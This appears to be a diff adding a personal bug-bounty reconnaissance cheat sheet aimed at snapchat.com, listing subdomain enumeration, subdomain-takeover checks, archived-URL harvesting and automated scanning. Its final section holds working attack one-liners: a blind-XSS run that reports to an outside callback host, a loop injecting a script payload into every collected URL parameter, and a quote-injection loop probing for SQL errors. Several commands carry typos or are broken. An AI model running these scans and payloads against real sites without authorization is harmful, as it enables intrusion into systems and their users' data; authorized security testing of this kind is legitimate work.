@@ -1,0 +1,77 @@
+###Subdomain enumeration
+#sublist3r
+	sublist3r -d snapchat.com
+	sublist3r -active -brute -d snapchat.com 
+#subfinder
+	subfinder -d snapchat.com
+	subfinder -d snapchat.com -recursive -silent -t 200 -v 
+#assetfinder
+	assetfinder -d snapchat.com
+#amass
+	amass enum -d snapchat.com
+	amass enum -active -brute -d snapchat.com
+	amass intel -whois -d snapchat.com
+#subdomainer.c99.nl (copy from website)
+#subbrute-bruteforcing
+	python3 subbrute.py snapchat.com 
+#FFUF
+	ffuf -u "https://FUZZ.snapchat.com" -w /home/abundance/hack/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+	ffuf -u "https://FUZZ.snapchat.com" -w /home/abundance/hack/SecLists/Discovery/DNS/shubs-subdomains.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+	ffuf -u "https://FUZZ.snapchat.com" -w /home/abundance/hack/SecLists/Discovery/DNS/bestDnsWordlist.txt -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g'
+#crt.sh
+	curl -s "https://crt.sh/?q=%.snapchat.com.np&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u
+#findomain
+	findomain -t snapchat.com
+#knockpy
+	p knockpy,py snapchat.com
+#combine all results and differentaite
+	cat *.txt | anew all.txt
+	cat all.txt | httpx | live-subdomains.txt 	
+
+#massdns(after getting all subdomains-including offline)
+	./bin/massdns -r lists/resolvers.txt  -t A /home/abundance/all.txt > massdns.txt
+	cat massdns.out | awk '{print $1}' | sed 's/.$//' | anew  live-subdomains.txt
+	
+------------------------------**************************************-----------------------------------------------------------	
+
+
+ ###subdomain-takeover
+ #Subzy
+ 	subzy -targets all.txt
+ #subjack
+	subjack -w /home/abundance/darazRecon/all.txt -c /home/abundance/go/pkg/mod/github.com/haccer/subjack@v0.0.0-20201112041112-49c51e57deab/fingerprints.json
+	subjack -w all.txt -t 100 -timeout 30 -o results.txt -ssl
+
+---------------------------------------*****************************---------------------------------------------------------------------
+#automation
+
+#waybackurls(first do for main-domain, then try with other important domain and then with all other subdomains):
+ 	waybackurls snapchat.com (shows for both domain and sub-domains)
+ 	cat domains-list.txt | waybackurls (for list of domains)
+ 	echo "snapchat.com" | waybackurls | anew waybackurls.txt -no-subs (only works for main domain and not sub-domain)
+ 	cat waybackurls.txt | httpx | anew live.txt
+ 	
+ 	
+#gau(works only for main domain, so send all subdomains)
+ 	gau snapchat.com | anew gau.txt
+ 	cat sub-domains.txt | gau --threads 10
+	cat gau.txt | httpx | anew live.txt
+
+
+ #gf, dalfox tool(we dont have to use grep, because gf is collection of complex grep commands)
+ 	#xss
+ 	cat live.txt | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox pipe > output-xss.txt
+ 	#blind xss:		
+ 	cat live.txt | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_blind_xss.txt && cat Possible_blind_xss.txt | dalfox -b abundance.xss.ht pipe > output-blind-xss.txt
+ 	#reflected xss: 	
+ 	cat live.txt | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+ 	#sqli
+ 	cat live.txt | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | egrep -qs "(mysql_fetch_array|SQL syntax)" && echo "possible sql injection here $host" ; done
+
+ 	
+ 	
+ 	
+ 	
+--------------------------------------****************************---------------------------------------------------------------------------------------- 
+ 
+
